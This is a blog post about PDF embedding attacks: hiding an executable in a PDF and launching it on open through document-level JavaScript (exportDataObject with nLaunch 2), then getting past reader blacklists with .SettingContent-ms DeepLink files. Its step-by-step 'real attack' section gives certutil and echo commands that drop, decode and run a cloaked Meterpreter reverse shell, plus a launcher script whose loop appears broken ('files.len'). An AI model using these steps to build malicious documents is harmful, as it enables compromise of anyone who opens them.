---
title: "PDF Embedding Attacks"
date: 2018-08-04T12:17:11-05:00
categories:
- Hacking
- Programming
- JavaScript
description: Turns out, it's possible to embed files that automatically execute as soon as a PDF is opened, making it an optimal malware delivery mechanism.
---

PDF, or Portable Document Format, is an incredibly complex file format, governed by many
standards and semi-standards. Like HTML and CSS, it was primarily designed for document
layout and presentation. Also like HTML and CSS, it has been augmented with a JavaScript
engine and document API that allows programmers to turn PDF documents into applications -
or vehicles for malware.

# Embedding Files in PDF Documents

It's very easy to embed any kind of file in a PDF document. Every document includes the
`EmbeddedFiles` name tree, along with support for collections of files, known as
portfolios.

Most PDF libraries provide support for this; we'll examine PyPDF2, which supports
everything we need and is pure Python.

PyPDF2's `PdfFileWriter` provides a method called `addAttachment` which takes a name
and some bytes and embeds them as a file in the PDF ([docs](https://pythonhosted.org/PyPDF2/PdfFileWriter.html?highlight=embed)).

This is how malware is usually concealed in a PDF document - as an embedded file.

# Opening Files from PDF Documents

Now that we have a payload embedded in a PDF document, we need to actually open it.
The basic method for this is to also embed a script in the PDF document. In our case, we
want to add a document level script. This script will execute as soon as the PDF is opened.

Fortunately, PyPDF2 also supports this! We can simply add a JavaScript object with the
method `addJS`, and that JavaScript will be registered to run on the PDF opening.

Our JavaScript payload is pretty simple: we just add a single call to `exportDataObject`,
a function provided by the PDF reader. This function takes an object with 2 parameters:

- `cName`, the name of the embedded object, and
- `nLaunch`, an instruction as to what the PDF reader should do with the exported object

`nLaunch` is just an integer, and it has three valid values:

0. Prompt the user for a path and save the file there
1. Prompt the user for a path, save the file, and ask the operating system to open it
2. Pick a temporary location, save the file there, and ask the operating system to open it

That last option sounds great for malware. Assuming we embedded a file called
`myExploit.exe`, we would add the following JavaScript:

```javascript
this.exportDataObject({
    cName: "myExploit.exe",
    nLaunch: 2,
});
```
and it would run as soon as the PDF was opened, right? Well, not quite. Unfortunately,
there's a bit more to it; Adobe Reader (and most other readers) will prevent the launch
of common executable files. For example, `.exe`, `.js`, `.vba`, and `.bat` files cannot
be opened. 

# Evading the Blacklist

There are many ways to evade the blacklist, such as Microsoft Word documents with
malicious macros embedded in them ([read more](https://isc.sans.edu/forums/diary/PDF+maldoc1+maldoc2/20079/<Paste>)),
but recently, researchers discovered that another kind of file could be used: 
`.SettingContent-ms`. As explained by [the SpecterOps team](https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39), these are just XML documents pointing to specific places in 
the Windows 10 settings GUI. However, they contain a field called `DeepLink` which can
contain any arbitrary executable which will be run when the `SettingsContent-ms` file is
executed.

# Deploying a Payload

Let's bring this all together. How would we use this in a real attack?

There are a few steps we need to perform in order to get this attack working.

## 1: Create a Payload

There are many great ways of creating effective payloads. In this case, I'll assume you
have a payload already; my payload of choice is a Meterpreter reverse shell encoded with
some type of cloaker.

## 2: Encode the Payload in Base64

We can use `certutil.exe -encode InputFile EncodedFile` on Windows or
`base64 input > output` on Linux to encode and decode files with Base64. This will let
us more readily insert it where it is needed.

## 3: Embedded Files 

We need to run 3 commands, so we'll use the above method to embed three files. They will
all be valid `SettingContent-ms` XML, differing only in the `DeepLink` node.

1. `PutFile.SettingContent-ms` which will `echo` the Base64 encoded payload to disk at a
known path (`echo b46c827y... > %APPDATA%\evil.b64`).
2. `Decode.SettingContent-ms` which will decode the Base64 encoded payload into an EXE (
`certutil -decode %APPDATA%\evil.b64 %APPDATA%\evil.exe`)
3. `Execute.SettingContent-ms` which will actually run that file. (`%APPDATA%\evil.exe`)

## 4: Scripts

Now, we need a single script which will run all of these:

```javascript
var files = ["PutFile", "Decode", "Execute"];
for (var i = 0; i < files.len; i++) {
	this.exportDataObject({
		cName: files[i] + ".SettingContent-ms",
		nLaunch: 2,
	});
}
```

## 5: Pwnage!

Now we have our Metasploit payload running on the target! Congratulations, time to move
into post-exploitation.

## Alternative Methods

Another method would be to use Reflective PE Injection, converting a PowerShell process
into the process for our executable. To learn more about this, check out [this post](https://truesecdev.wordpress.com/2016/03/15/embedding-exe-files-into-powershell-scripts/).


# Conclusion

PDF files are extremely complex, and the applications that read them tend to be old and
full of cruft, designed without security in mind. A black-listing method will never be
effective in eliminating all dangerous files, as we can see here. This technique requires
no exploits; we just ask the OS to run a file for us and it does so!

